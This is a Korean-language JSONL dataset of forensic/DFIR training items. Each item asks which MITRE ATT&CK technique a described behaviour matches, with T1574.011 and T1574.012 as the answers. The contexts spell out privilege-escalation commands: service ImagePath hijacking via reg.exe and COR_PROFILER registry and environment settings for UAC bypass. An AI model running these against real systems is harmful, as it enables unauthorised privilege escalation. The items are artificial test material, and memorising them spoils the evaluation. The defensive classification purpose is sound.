{"id": "T1574.011_T1574.011-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.011 Hijack Execution Flow: Services Registry Permissions Weakness (Tactic: Privilege Escalation)\n[요약] 서비스 레지스트리 키의 권한(ACL)을 열람해, 일반 사용자 또는 비관리자 계정이 수정 가능한 취약 서비스가 존재하는지 확인하는 시나리오이다. 취약한 서비스 키를 찾으면 이후 ImagePath 변경을 통한 권한 상승으로 이어질 수 있다.\n[절차] PowerShell을 관리자 권한 또는 적절한 권한으로 실행한다. get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL 명령으로 모든 서비스 키의 ACL 정보를 확인한다. get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL 명령으로 특정 취약 서비스(<weak_service_name>)의 권한 구성을 상세히 확인한다. ACL 정보에서 Authenticated Users, Users 등 일반 계정에 대한 SetValue/FullControl 권한이 있는지 확인한다.\n[대표 명령 예시]\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL", "answer": "이 행위는 MITRE ATT&CK의 T1574.011 \"Hijack Execution Flow: Services Registry Permissions Weakness\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.011_T1574.011-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.011 Hijack Execution Flow: Services Registry Permissions Weakness (Tactic: Privilege Escalation)\n[요약] 권한이 취약한 서비스의 ImagePath 레지스트리 값을 악성 실행 파일 경로로 변경하는 시나리오이다. 먼저 benign 서비스(<weak_service_path>)로 서비스를 생성한 뒤, reg.exe를 사용해 해당 서비스의 ImagePath를 악성 경로(<malicious_service_path>, 기본 cmd.exe)로 교체한다. 이후 서비스가 시작되면 악성 경로가 서비스 권한(잠재적으로 SYSTEM)으로 실행될 수 있다.\n[절차] 테스트에 사용할 취약 서비스 이름(<weak_service_name>), 원래 서비스 경로(<weak_service_path>), 악성 서비스 경로(<malicious_service_path>)를 결정한다. 사전 조건 스크립트를 통해 <weak_service_name> 서비스가 존재하는지 확인하고, 없으면 sc.exe create <weak_service_name> binpath= \"<weak_service_path>\" 명령으로 benign 서비스를 생성한다. reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\" 명령으로 ImagePath 값을 악성 경로로 변경한다. 이후(테스트 외부 단계) 서비스 <weak_service_name>를 시작하면, 설정된 <malicious_service_path>가 서비스 권한으로 실행될 수 있다.\n[대표 명령 예시]\nreg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\"", "answer": "이 행위는 MITRE ATT&CK의 T1574.011 \"Hijack Execution Flow: Services Registry Permissions Weakness\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.012_T1574.012-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.012 Hijack Execution Flow: COR_PROFILER (Tactic: Privilege Escalation)\n[요약] 사용자 범위(HKCU)에서 COR_PROFILER 관련 레지스트리와 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. 커스텀 CLSID와 프로파일러 DLL 경로를 HKCU에 등록하고, Event Viewer(eventvwr.msc)를 실행해 CLR이 로드될 때 프로파일러 DLL(T1574.012x64.dll)이 로드되도록 유도한다. 로컬 관리자 계정일 경우 UAC를 우회해 notepad.exe가 높은 무결성(High Integrity)으로 실행될 수 있다.\n[절차] <file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건 단계에서 GitHub에서 다운로드). PowerShell에서 HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32 키를 생성하고 기본값으로 <file_name> 경로를 설정한다. HKCU:\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 환경 변수 값을 생성한다. MMC.EXE EVENTVWR.MSC 명령을 실행해 Event Viewer를 실행하고, CLR 로딩 시 프로파일러 DLL이 호출되는지(예: notepad.exe 실행 여부) 확인한다.\n[대표 명령 예시]\nWrite-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\<clsid_guid>\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32\" -Value \"<file_name>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC", "answer": "이 행위는 MITRE ATT&CK의 T1574.012 \"Hijack Execution Flow: COR_PROFILER\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.012_T1574.012-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.012 Hijack Execution Flow: COR_PROFILER (Tactic: Privilege Escalation)\n[요약] 시스템 범위(HKLM) 환경 변수에 COR_PROFILER를 설정해, CLR이 어느 프로세스에서든 로드될 때 프로파일러 DLL이 실행되도록 만드는 시나리오이다. 세션 관리자(Environment) 키에 COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH를 등록하며, 시스템 재부팅 후 모든 .NET 프로세스가 해당 프로파일러를 로드할 수 있다. Event Viewer 등 고무결 프로세스 실행 시 UAC 우회 및 고권한 notepad.exe 실행이 가능하다.\n[절차] <file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드). PowerShell을 관리자 권한으로 실행한다. HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 시스템 환경 변수를 추가한다. 변경 사항을 완전히 적용하려면 시스템을 재부팅한다. 재부팅 후 Event Viewer 또는 다른 .NET 기반 애플리케이션을 실행해 프로파일러 DLL이 로드되고 페이로드가 실행되는지 확인한다.\n[대표 명령 예시]\nWrite-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null", "answer": "이 행위는 MITRE ATT&CK의 T1574.012 \"Hijack Execution Flow: COR_PROFILER\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.012_T1574.012-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.012 Hijack Execution Flow: COR_PROFILER (Tactic: Privilege Escalation)\n[요약] 레지스트리 변경 없이, 현재 프로세스 범위에서만 COR_PROFILER 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. PowerShell 세션 내에서 환경 변수를 설정한 후, 동일 세션에서 PowerShell -c 'Start-Sleep 1'을 실행해 CLR을 로드하고 프로파일러 DLL(T1574.012x64.dll)이 실행되도록 한다. 디스크/레지스트리 흔적을 최소화한 단발성 실행·테스트에 유용하다.\n[절차] <file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드). PowerShell에서 $env:COR_ENABLE_PROFILING = 1, $env:COR_PROFILER = '<clsid_guid>', $env:COR_PROFILER_PATH = '\"<file_name>\"' 값을 설정한다. 동일한 PowerShell 세션에서 POWERSHELL -c 'Start-Sleep 1' 명령을 실행해 하위 PowerShell 프로세스에서 CLR을 로드한다. 프로파일러 DLL이 로드되어 페이로드가 실행되는지(예: notepad.exe 실행, 기타 동작) 관찰한다. 테스트 후 환경 변수를 초기화해($env:COR_* 값 리셋) 추가 CLR 로딩 시 더 이상 프로파일러가 사용되지 않도록 한다.\n[대표 명령 예시]\n$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '<clsid_guid>'\n$env:COR_PROFILER_PATH = '\"<file_name>\"'\nPOWERSHELL -c 'Start-Sleep 1'", "answer": "이 행위는 MITRE ATT&CK의 T1574.012 \"Hijack Execution Flow: COR_PROFILER\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
